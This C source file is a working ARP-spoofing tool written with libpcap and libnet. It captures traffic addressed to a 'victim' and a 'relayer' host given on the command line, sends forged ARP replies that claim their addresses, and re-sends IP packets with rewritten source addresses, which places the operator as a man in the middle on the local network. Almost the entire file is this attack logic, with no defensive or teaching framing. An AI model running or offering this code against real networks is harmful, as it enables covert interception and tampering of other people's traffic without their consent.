#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <string.h>
#include <libnet.h>
#include <stdint.h>


/* Ethernet addresses are 6 bytes */
//#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET 14
	/* Ethernet header */
	struct sniff_ethernet {
		u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
		u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
		u_short ether_type; /* IP? ARP? RARP? etc */
	};
 	struct sniff_arp { 
    		u_int16_t htype;    /* Hardware Type           */ 
    		u_int16_t ptype;    /* Protocol Type           */ 
    		u_char hlen;        /* Hardware Address Length */ 
    		u_char plen;        /* Protocol Address Length */ 
    		u_int16_t oper;     /* Operation Code          */ 
    		u_char sha[6];      /* Sender hardware address */ 
    		u_char spa[4];      /* Sender IP address       */ 
    		u_char tha[6];      /* Target hardware address */ 
    		u_char tpa[4];      /* Target IP address       */ 
	}; 

	/* IP header */
	struct sniff_ip {
		u_char ip_vhl;		/* version << 4 | header length >> 2 */
		u_int8_t ip_tos;		/* type of service */
		u_int16_t ip_len;		/* total length */
		u_int16_t ip_id;		/* identification */
		u_int16_t ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
		u_int8_t ip_ttl;		/* time to live */
		u_int8_t ip_p;		/* protocol */
		u_int16_t ip_sum;		/* checksum */
		struct in_addr ip_src,ip_dst; /* source and dest address */
	};
	#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
	#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

	/* TCP header */
	typedef u_int tcp_seq;

	struct sniff_tcp {
		u_short th_sport;	/* source port */
		u_short th_dport;	/* destination port */
		tcp_seq th_seq;		/* sequence number */
		tcp_seq th_ack;		/* acknowledgement number */
		u_char th_offx2;	/* data offset, rsvd */
	#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
		u_char th_flags;
	#define TH_FIN 0x01
	#define TH_SYN 0x02
	#define TH_RST 0x04
	#define TH_PUSH 0x08
	#define TH_ACK 0x10
	#define TH_URG 0x20
	#define TH_ECE 0x40
	#define TH_CWR 0x80
	#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
		u_short th_win;		/* window */
		u_short th_sum;		/* checksum */
		u_short th_urp;		/* urgent pointer */
};

u_int32_t v_ip;
char *v_ips;
u_int32_t r_ip;
char *r_ips;
u_int8_t *v_mac;
char *v_macs;
u_int8_t *r_mac;
char *r_macs;
libnet_t *ln_context;
char dev[32];
pcap_t *my_handle;

const struct sniff_ethernet* strip_ethernet(const struct pcap_pkthdr *header, const u_char *packet){
	const struct sniff_ethernet *ethernet;
	ethernet = (struct sniff_ethernet*)(packet);
	return ethernet;
}

const struct sniff_arp* strip_arp(const struct pcap_pkthdr *header, const u_char *packet){
	const struct sniff_arp *arp;
	arp = (struct sniff_arp*)(packet + SIZE_ETHERNET);
	return arp;
}

const struct sniff_ip* strip_ip(const struct pcap_pkthdr *header, const u_char *packet){
	const struct sniff_ip *ip;
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	printf("Calling IP_HL\n");
	int size_ip = IP_HL(ip)*4;
	printf("Checking ip header length\n");
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return NULL;
	}
	return ip;
}

int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const u_char *payload, u_int32_t payload_s){
	libnet_clear_packet(ln_context);
	if (libnet_build_ipv4 (htons(ip->ip_len),
    		ip->ip_tos, htons(ip->ip_id), htons(ip->ip_off),
    		ip->ip_ttl, ip->ip_p, 0,
    		src_ip, ip->ip_src.s_addr, payload,
    		payload_s, ln_context, 0) == -1 )
  	{
    		fprintf(stderr, "Error building IP header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	// Construct Ethernet header
	printf("Ether_type: %hu\n", ethernet->ether_type);
	if ( libnet_build_ethernet(ethernet->ether_shost, src_mac, ETHERTYPE_IP, 
		NULL, 0, ln_context, 0) == -1 )
  	{
    		fprintf(stderr, "Error building Ethernet header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	int bytes_written = libnet_write(ln_context);
	if ( bytes_written != -1 )
    		printf("%d bytes written.\n", bytes_written);
  	else
    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
	return bytes_written;
	
}
int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_arp *arp){
	libnet_clear_packet(ln_context);
	// Construct ARP header
	int i;				      
	printf("Sending values:\n");
	printf("Sender MAC: "); 
    for(i=0; i<6;i++)
        printf("%02X:", arp->sha[i]); 


    printf("\nSender IP: "); 
    for(i=0; i<4; i++)
        printf("%d.", arp->spa[i]);


    printf("\nTarget MAC: "); 

    for(i=0; i<6;i++)
        printf("%02X:", src_mac[i]); 

    printf("\nTarget IP: "); 
    for(i=0; i<4;i++)
        printf("%d.", arp->tpa[i]); 
	
	printf("\n");
	
	/*u_int8_t *dst_mac;
	u_int32_t dst_ip;
	int length;
	dst_mac = libnet_hex_aton(arp->sha, &length);
	if(dst_mac == NULL){
		printf("Error converting relayer mac address\n");
		return(0);
	}
	dst_ip = libnet_name2addr4(ln_context, arp->spa, LIBNET_DONT_RESOLVE);
	if(dst_ip == -1){
		printf("Error converting relayer ip address\n");
		return(0);
	}*/
	
	
	if ( libnet_autobuild_arp (ARPOP_REPLY,
		src_mac,
      		(u_int8_t *)(&src_ip),
      		arp->sha,
      		(u_int8_t *)(&arp->spa), ln_context) == -1)
  	{
    		fprintf(stderr, "Error building ARP header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	printf("Constructing ethernet header\n");
	// Construct Ethernet header
	const char *aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
	printf("Source ethernet: %s\n", aux);
	if ( libnet_build_ethernet(arp->sha, src_mac, ETHERTYPE_ARP, 
		NULL, 0, ln_context, 0) == -1 )
  	{
    		fprintf(stderr, "Error building Ethernet header: %s\n",\
        	libnet_geterror(ln_context));
    		libnet_destroy(ln_context);
    		exit(0);
  	}
	printf("Writing arp reply\n");
	int bytes_written = libnet_write(ln_context);
	if ( bytes_written != -1 )
    		printf("%d bytes written.\n", bytes_written);
  	else
    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
	return bytes_written;
}
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	printf("Sending response from victim to attacker\n");
	
	const struct sniff_ethernet *ethernet;
	ethernet = strip_ethernet(header, packet);
	struct ether_header *eptr = (struct ether_header *) packet;
	u_int8_t *src_mac;
	u_int32_t src_ip;
	// Do a couple of checks to see what packet type we have..
	if (ntohs (eptr->ether_type) == ETHERTYPE_IP)
    	{
        printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                ntohs(eptr->ether_type),
                ntohs(eptr->ether_type));
		printf("Size of r_mac: %lu\n", sizeof(r_mac));
		if(memcmp(ethernet->ether_dhost, r_mac, 6) == 0){
			src_mac = v_mac;
			src_ip = v_ip;
		}else if(memcmp(ethernet->ether_dhost, v_mac, 6) == 0){
			src_mac = r_mac;
			src_ip = r_ip;
		}else{
			printf("  *  Unexpected error: received packet that doesn't match our mac address\n");
			return;
		}
		const struct sniff_ip *ip;
		ip = strip_ip(header, packet);
		const u_char *payload;
		u_int32_t payload_s;
		u_int size_ip = IP_HL(ip)*4;
		printf("Checking ip header length\n");
		if (size_ip < 20) {
			printf("   * Invalid IP header length: %u bytes\n", size_ip);
			return;
		}
		const u_char *ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
		u_int32_t ip_payload_s = header->len - (SIZE_ETHERNET + size_ip);
		reflect_ip(src_mac, src_ip, ethernet, ip, ip_payload, ip_payload_s);
		printf("Finished reflecting IP packet\n");
		return;
    	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
    	{
        printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
                ntohs(eptr->ether_type),
                ntohs(eptr->ether_type));
		const struct sniff_arp *arp;
		arp = strip_arp(header, packet);
		printf("Size of r_mac: %lu\n", sizeof(r_mac));
		if(memcmp(arp->tpa, &r_ip, 4) == 0){
			src_mac = r_mac;
			src_ip = r_ip;
		}else if(memcmp(arp->tpa, &v_ip, 4) == 0){
			src_mac = v_mac;
			src_ip = v_ip;
		}else{
			printf("  *  Unexpected error: received packet that doesn't match our mac address\n");
			return;
		}		
		arp_spoof(src_mac, src_ip, ethernet, arp);
		printf("Finished spoofing ARP response\n");
		return;
    	}else {
        	printf("Ethernet type %x not IP", ntohs(eptr->ether_type));
        	//exit(1);
    	}
        printf("\n");
	
											  
	return;	
}


int main(int argc, char *argv[])
{
	char *victim_ip = NULL;
	char *victim_eth = NULL;
	char *relayer_ip = NULL;
	char *relayer_eth = NULL;
	char *interface = NULL;
	int length;
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[32];	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	//const u_char *packet;		/* The actual packet */

	static struct option long_options[] = {
            {"victim-ip",     required_argument, NULL,  'a' },
            {"victim-ethernet",  required_argument, NULL,  'b' },
            {"interface", required_argument,       NULL,  'c'},
            {"relayer-ip",  required_argument, NULL, 'd'},
            {"relayer-ethernet",    required_argument, NULL,  'e' },
            {0,         0,                 0,  0 }
        };
	char ch;
	while ((ch = getopt_long(argc, argv, "", long_options, NULL)) != -1)
	{
    		// check to see if a single character or long option came through
   		switch (ch)
    		{
         	// short option 't'
         	case 'a':
             		victim_ip = optarg; // or copy it if you want to
             		break;
         		// short option 'a'
         	case 'b':
             		victim_eth = optarg; // or copy it if you want to
             		break;
		case 'c':
			interface = optarg;
			break;
		case 'd':
			relayer_ip = optarg;
			break;
		case 'e':
			relayer_eth = optarg;
			break;
    		}
	}
	printf("Victim_ip = %s, victim_eth = %s\nrelayer_ip = %s, relayer_eth = %s\ndevice = %s\n", victim_ip, victim_eth, relayer_ip, relayer_eth, interface);
	
	if (victim_ip == NULL || victim_eth == NULL || relayer_eth == NULL || relayer_ip == NULL){
		printf("Missing args\n");
		return(0);
	}
	//strcpy(filter_exp, "dst port 8000 and dst host ");
	strcpy(filter_exp, "dst host ");
	strcat(filter_exp, victim_ip);
	strcat(filter_exp, " or dst host ");
	strcat(filter_exp, relayer_ip);
	// Libnet initialization
	char ln_errbuf[LIBNET_ERRBUF_SIZE];
	ln_context = libnet_init(LIBNET_LINK, NULL, ln_errbuf);
	if ( ln_context == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", ln_errbuf);
    		return(0);
  	}
	v_ips = victim_ip;
	v_ip = libnet_name2addr4(ln_context, victim_ip,\
                  LIBNET_DONT_RESOLVE);
	if(v_ip == -1){
		printf("Error converting victim ip address\n");
		return(0);
	}
	r_ips = relayer_ip;
	r_ip = libnet_name2addr4(ln_context, relayer_ip,\
                  LIBNET_DONT_RESOLVE);
	if(r_ip == -1){
		printf("Error converting relayer ip address\n");
		return(0);
	}
	v_macs = victim_eth;
	v_mac = libnet_hex_aton(victim_eth, &length);
	if(v_mac == NULL){
		printf("Error converting victim mac address\n");
		return(0);
	}
	r_macs = relayer_eth;
	r_mac = libnet_hex_aton(relayer_eth, &length);
	if(r_mac == NULL){
		printf("Error converting relayer mac address\n");
		return(0);
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	// define the device
	if(interface == NULL){
		char *tmp = pcap_lookupdev(errbuf);
		if (tmp == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(2);
		}else{
			strcpy(dev, tmp);
		}
	}else
		strcpy(dev, interface);
	printf("Device: %s\n", dev);
	// Find the properties for the device
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	struct in_addr ip_addr;
    	ip_addr.s_addr = net;
	printf("Net id: %s\n", inet_ntoa(ip_addr));
	pcap_t *handle;
	// open the session
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	// compile and apply the filter
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	// grab a packet
	//packet = pcap_next(handle, &header);
	// loop through packets
	pcap_loop(handle, -1, got_packet, NULL);
	/* Print its length */
	printf("Jacked a packet with length of [%d]\n", header.len);
	/* And close the session */
	pcap_close(handle);
	return(0);
  }
